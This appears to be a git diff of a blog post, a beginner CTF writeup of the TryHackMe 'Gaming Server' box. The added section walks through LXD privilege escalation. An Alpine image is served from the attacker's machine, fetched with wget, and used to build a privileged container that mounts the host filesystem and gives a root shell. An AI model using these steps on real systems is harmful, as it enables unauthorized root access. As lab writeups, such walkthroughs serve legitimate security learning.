@@ -3,7 +3,7 @@ layout: post
 title: Gaming Server writeup
 subtitle: An Easy Boot2Root box for beginners
 cover-img: /assets/img/path.jpg
-thumbnail-img: /assets/img/kiba/logo.png
+thumbnail-img: /assets/img/gs/logo.png
 share-img: /assets/img/path.jpg
 tags: [ctf,tryhackme, writeup, gamingserver,lxd]
 ---
@@ -87,7 +87,7 @@ Final, run john with *dict.lst* to crack the password.
 
 Now access to machine with this password. 
 
-![gs1](/assets/img/gs/gs7.png)
+![gs1](/assets/img/gs/gs8.png)
 
 
 Yeah, we got flag!!!
@@ -122,3 +122,52 @@ cd lxd-alpine-builder
 
 On running the above command, alpine-v3.12-x86_64-20200903_0332.tar.gz  file is created in the working directory that we have transferred to the host machine.
 
+```
+python3 -m http.server 8080
+```
+
+On another hand we will download the alpine-image inside on the host machine.
+
+```
+wget http://10.11.*.*:8080/alpine-v3.12-x86_64-20200903_0332.tar.gz .
+```
+
+After the image is built it can be added as an image to LXD as follows:
+
+```
+lxc image import ./alpine-v3.12-x86_64-20200903_0332.tar.gz  --alias myimage
+```
+
+use the list command to check the list of images
+
+```
+lxc image list
+```
+
+![gs1](/assets/img/gs/gs9.png)
+
+On the host machine: run cmd following:
+
+```
+
+lxc init myimage ignite -c security.privileged=true
+lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+lxc start ignite
+lxc exec ignite /bin/sh
+id
+
+```
+
+![gs1](/assets/img/gs/gs10.png)
+
+Final, in order to find the root flag. 
+
+```
+find / -name "root.txt" 2>/dev/null
+```
+
+Yeah we got the root flag!!!
+
+![gs1](/assets/img/gs/gs11.png)
+
+SOlVED!!!
